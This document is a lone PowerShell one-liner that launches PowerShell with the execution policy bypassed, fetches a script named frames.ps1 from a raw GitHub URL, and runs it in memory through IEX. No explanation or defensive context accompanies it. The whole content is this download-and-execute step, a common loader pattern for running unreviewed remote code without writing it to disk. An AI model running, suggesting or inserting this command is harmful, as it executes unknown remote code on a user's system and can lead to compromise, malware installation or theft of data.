Start-Process powershell -ArgumentList '-NoProfile -ExecutionPolicy Bypass -Command "IEX(IWR https://raw.githubusercontent.com/lubrj/saves/refs/heads/main/frames.ps1 -UseBasicParsing)"'
